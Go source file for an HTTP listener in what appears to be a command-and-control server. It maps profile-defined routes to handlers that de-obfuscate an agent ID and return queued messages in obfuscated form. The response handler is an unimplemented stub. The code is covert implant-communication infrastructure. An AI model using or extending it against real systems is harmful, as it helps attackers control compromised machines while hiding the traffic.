package listeners

import (
	"c2/repos"
	"common/profiles"
	"log"
	"net/http"
	"strings"
)

type ListenerService struct {
	Server *http.Server
}

func maybeAbort(err error, r *http.Request) (abort bool) {
	if err == nil {
		return false
	}
	// TODO: Do something if needed.
	log.Println("endpoint error handler:", err)
	return true
}

func getLatestMessage(req *profiles.ProfileRequest) (handler func(w http.ResponseWriter, r *http.Request)) {
	return func(w http.ResponseWriter, r *http.Request) {
		obfuscatedAgentID, err := extractPlacement(&req.ID.Placement, r)
		if maybeAbort(err, r) {
			return
		}
		agentID, err := profiles.OperateDataReverseOperations(&req.ID.Operations, &obfuscatedAgentID, false)
		if maybeAbort(err, r) {
			return
		}

		message, err := repos.GetOldestMessageForAgent(agentID)
		if /*!errors.Is(err, gorm.ErrRecordNotFound) && */ maybeAbort(err, r) {
			return
		}

		obfuscatedResponse, err := profiles.OperateData(&req.Payload.Response.Operations, &message.Request, true)
		if maybeAbort(err, r) {
			return
		}

		if req.Payload.Response.StatusCode > 0 {
			w.WriteHeader(req.Payload.Response.StatusCode)
		}
		w.Write([]byte(obfuscatedResponse))

		// fmt.Println(agentID, "\n", payload)
	}

}

func respondToMessage(profile *profiles.ProfileRequest) (handler func(w http.ResponseWriter, r *http.Request)) {
	return func(w http.ResponseWriter, r *http.Request) {
		// TODO

		// obfuscatedData, err := extractPlacement(&req.Payload.Placement, r)
		// if !errors.Is(err, ErrPlacementUnspecified) && maybeAbort(err, r) {
		// 	return
		// }
		// payload, err := profiles.OperateDataReverseOperations(&req.Payload.Operations, &obfuscatedData, false)
		// if maybeAbort(err, r) {
		// 	return
		// }
	}
}

func handlersFromProfile(profile *profiles.Profile) (handler *http.ServeMux, err error) {
	handler = http.NewServeMux()

	for _, method := range profile.Receive.Methods {
		for _, route := range profile.Receive.Routes {
			if !strings.HasPrefix(route, "/") {
				route = "/" + route
			}
			handler.HandleFunc(method+" "+route, getLatestMessage(&profile.Receive))
		}
	}

	for _, method := range profile.Respond.Methods {
		for _, route := range profile.Respond.Routes {
			if !strings.HasPrefix(route, "/") {
				route = "/" + route
			}
			handler.HandleFunc(method+" "+route, respondToMessage(&profile.Respond))
		}
	}

	return handler, nil
}
